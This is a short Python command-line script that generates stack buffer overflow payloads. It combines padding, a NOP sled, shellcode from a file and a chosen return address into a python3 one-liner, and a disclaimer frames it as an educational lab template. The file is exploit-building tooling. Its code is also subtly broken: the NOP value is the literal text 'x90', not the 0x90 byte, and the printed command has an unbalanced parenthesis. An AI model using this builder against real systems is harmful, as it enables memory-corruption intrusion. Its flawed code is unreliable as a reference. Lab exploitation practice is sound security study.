#!/usr/bin/python3

'''
Author: Jesús Vargas (@MrEkos)
Description:
    Educational proof of concept buffer overflow script to create a payload.

⚠️ Disclaimer
This script is an educational proof-of-concept template intended for use in your own lab environments only. 
It does not contain real return addresses or live shellcode and will not execute as-is.
Do not use it against systems you do not own or without explicit permission.
Do not include proprietary content or spoilers from platforms such as Hack The Box.
Use at your own risk.

Usage:

sudo chmod +x Exploit_Builder.py
./Exploit_builder.py --help

'''
import click

def building(offset, address, nops, shellcode):
   nop_format = "b'x90'"
   padding_format = "b'E'"
   expre = f"offset = {offset}; nops = {nop_format} * {nops}; shellcode = open('{shellcode}', 'rb').read(); padding = {padding_format} * (offset - len(nops) - len(shellcode)); eip = b'{address}'; payload = padding + nops + shellcode + eip; sys.stdout.buffer.write(payload)"
   
   return expre

@click.command()
@click.option('--offset', '-off', type=int, required=True,
              help='Offset bytes.')
@click.option('--address', '-ra', type=str, required=True,
              help='Return address string (little endian)')
@click.option('--nops', '-n', type=int, required=True,
              help='Number of NOPs to use.')
@click.option('--shellcode', '-s', required=True,
              help='Shellcode path')
def main(offset, address, nops, shellcode):
    expre = building(offset, address, nops, shellcode)
    print('python3 -c "import sys; ', expre, '")')

if __name__ == "__main__":
    main()
